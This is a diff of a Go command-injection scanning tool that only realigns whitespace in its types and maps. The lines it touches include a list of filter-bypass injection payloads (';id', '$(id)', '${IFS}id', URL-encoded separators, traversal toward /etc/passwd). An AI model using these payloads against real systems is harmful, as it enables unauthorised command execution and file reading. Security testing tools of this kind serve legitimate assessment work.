@@ -14,24 +14,24 @@ import (
 type CommandExecutionType string
 
 const (
-	Exec     CommandExecutionType = "exec"
-	Passthru CommandExecutionType = "passthru"
+	Exec      CommandExecutionType = "exec"
+	Passthru  CommandExecutionType = "passthru"
 	ShellExec CommandExecutionType = "shell_exec"
-	System   CommandExecutionType = "system"
-	Popen    CommandExecutionType = "popen"
-	ProcOpen CommandExecutionType = "proc_open"
+	System    CommandExecutionType = "system"
+	Popen     CommandExecutionType = "popen"
+	ProcOpen  CommandExecutionType = "proc_open"
 )
 
 // OSCommandInjection represents an OS command injection vulnerability.
 type OSCommandInjection struct {
-	Target        string
-	Port          int
-	Parameter     string
-	ExecType      CommandExecutionType
-	Payload       string
-	Timeout       time.Duration
-	Verbose       bool
-	Headers       map[string]string
+	Target    string
+	Port      int
+	Parameter string
+	ExecType  CommandExecutionType
+	Payload   string
+	Timeout   time.Duration
+	Verbose   bool
+	Headers   map[string]string
 }
 
 // CommandInjectionResult holds the result of a command injection attempt.
@@ -278,11 +278,11 @@ func hexEncode(s string) string {
 
 // CommandInjectionReport holds the scan results.
 type CommandInjectionReport struct {
-	Target     string                `json:"target"`
-	Param      string                `json:"parameter"`
-	Vulnerable bool                  `json:"vulnerable"`
+	Target     string                   `json:"target"`
+	Param      string                   `json:"parameter"`
+	Vulnerable bool                     `json:"vulnerable"`
 	Results    []CommandInjectionResult `json:"results"`
-	Timestamp  time.Time             `json:"timestamp"`
+	Timestamp  time.Time                `json:"timestamp"`
 }
 
 // GenerateReport creates a summary report of the command injection scan.
@@ -383,13 +383,13 @@ func (c *OSCommandInjection) ValidatePayload(payload string) bool {
 // FilterBypassPayloads returns payloads designed to bypass common filters.
 func (c *OSCommandInjection) FilterBypassPayloads() map[string][]string {
 	return map[string][]string{
-		"semicolon_filter":    {"|id", "||id", "&&id", "`id`", "$(id)"},
-		"pipe_filter":         {";id", "||id", "&&id", "$(id)"},
-		"space_filter":        {"${IFS}id", "$IFSid", "id", ";id"},
-		"slash_filter":        {"..;/etc/passwd", "..|/etc/passwd"},
-		"command_filter":      {"${exec:whoami}", "${runtime:whoami}"},
-		"quote_filter":        {"`;id`", "`;id`", "\";id\""},
-		"newline_filter":      {"%0aid", "%0Did", "%0Aid"},
-		"waf_simple":          {"%3Bid", "%7Cid", "%26%26id"},
+		"semicolon_filter": {"|id", "||id", "&&id", "`id`", "$(id)"},
+		"pipe_filter":      {";id", "||id", "&&id", "$(id)"},
+		"space_filter":     {"${IFS}id", "$IFSid", "id", ";id"},
+		"slash_filter":     {"..;/etc/passwd", "..|/etc/passwd"},
+		"command_filter":   {"${exec:whoami}", "${runtime:whoami}"},
+		"quote_filter":     {"`;id`", "`;id`", "\";id\""},
+		"newline_filter":   {"%0aid", "%0Did", "%0Aid"},
+		"waf_simple":       {"%3Bid", "%7Cid", "%26%26id"},
 	}
 }
